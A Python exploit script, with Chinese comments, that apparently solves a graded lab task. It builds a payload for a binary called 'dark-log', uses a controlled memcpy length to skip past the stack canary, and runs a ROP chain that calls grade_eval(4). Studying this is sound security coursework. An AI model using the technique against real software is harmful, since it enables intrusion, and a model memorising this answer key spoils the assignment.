"""Task 4: build the payload for attack/dark-log.

dark-log 开启了 Stack Protector：直接从 expression 写到返回地址会破坏 canary。
但 input() 里还有一句 memcpy(f.logMsg + f.len, f.expression, 128)，其中 f.len 位于
expression 的可写范围内（buffer+0x100），而 logMsg 在 buffer+0x80。

于是分两步：
1. gets 只写到 len 为止（260 字节），完全不碰 canary（buffer+0x118）；
2. 把 f.len 设成 0xa8，让 memcpy 的写入位置正好落在返回地址（rbp+8）上，
   既覆盖了返回地址，又绕过了 canary。
"""
import struct
import sys

POP_RDI = 0x4018A3                  # 5f c3        （pop r15; ret 的第二个字节起）
RET = 0x4018A4                      # c3
GRADE_EVAL = 0x401677

# memcpy 的目标 = logMsg(rbp-0xa0) + len，令其等于 rbp+8 => len = 0xa8
LEN_TO_RET = 0xA8
EXPR_LEN = 128
CANARY_OFFSET = 0x118               # canary 相对 expression 的偏移；gets 不会写到那里

chain = [
    POP_RDI,                        # pop rdi; ret
    4,                              # grade = 4
    RET,                            # 对齐
    GRADE_EVAL,                     # grade_eval(4)
    0,                              # grade_eval 返回后跳 0，直接结束
]

expr = b"".join(struct.pack("<Q", q) for q in chain)
expr = expr + b"\x00" * (EXPR_LEN - len(expr))

assert len(expr) == EXPR_LEN
line = expr + b"B" * EXPR_LEN + struct.pack("<I", LEN_TO_RET)
assert len(line) == 0x100 + 4 < CANARY_OFFSET

payload = line + b"\n"
sys.stdout.buffer.write(payload)
